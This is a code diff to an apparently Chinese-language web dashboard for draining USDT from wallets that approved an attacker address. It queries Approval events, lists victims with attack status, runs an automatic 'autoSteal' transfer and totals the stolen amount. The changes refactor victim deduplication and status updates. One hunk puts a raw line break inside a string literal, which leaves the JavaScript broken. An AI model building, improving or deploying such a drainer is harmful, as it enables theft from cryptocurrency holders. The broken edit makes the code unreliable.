@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="zh-Hant">
 <head>
@@ -52,7 +53,6 @@
     let totalStolen = ethers.BigNumber.from("0");
     let autoEnabled = false;
     const attackedSet = new Set();
-    const approvalMap = new Map();
 
     async function connect() {
       if (!window.ethereum) return alert("請安裝 MetaMask");
@@ -98,11 +98,13 @@
       const events = await contract.queryFilter(contract.filters.Approval(null, attacker), 19000000);
       const tbody = document.getElementById("approvals");
       tbody.innerHTML = "";
+      const seen = new Set();
+
       for (const ev of events.reverse()) {
         const owner = ev.args.owner;
-        if (!approvalMap.has(owner)) {
-          approvalMap.set(owner, ev.blockNumber);
-        }
+        if (seen.has(owner)) continue;
+        seen.add(owner);
+
         const time = new Date().toLocaleString();
         const tr = document.createElement("tr");
         tr.innerHTML = `
@@ -111,8 +113,10 @@
           <td class="status" id="status-${owner}">尚未攻擊</td>
         `;
         tbody.appendChild(tr);
+
         if (autoEnabled) await autoSteal(owner);
       }
+
       document.getElementById("refresh").innerText = new Date().toLocaleTimeString();
     }
 
@@ -134,8 +138,11 @@
         const formatted = ethers.utils.formatUnits(totalStolen, 6);
         document.getElementById("total").innerText = formatted + " USDT";
         document.getElementById("status").innerText = "✅ TX Hash: " + tx.hash;
-        document.getElementById(`status-${victim}`).innerText = "✅ 已攻擊";
-        document.getElementById(`status-${victim}`).className = "ok";
+        const cell = document.getElementById(`status-${victim}`);
+        if (cell) {
+          cell.innerText = "✅ 已攻擊";
+          cell.className = "ok";
+        }
         attackedSet.add(victim);
       } catch (e) {
         document.getElementById("status").innerText = "❌ 失敗: " + e.message;
@@ -152,7 +159,8 @@
           const readableBalance = ethers.utils.formatUnits(balance, 6);
           const readableAllowance = ethers.utils.formatUnits(allowance, 6);
           document.getElementById("balance").innerText =
-            "💰 USDT 餘額: " + readableBalance + " USDT\n📜 授權額度: " + readableAllowance + " USDT";
+            "💰 USDT 餘額: " + readableBalance + " USDT
+📜 授權額度: " + readableAllowance + " USDT";
         } catch {
           document.getElementById("balance").innerText = "查詢失敗";
         }
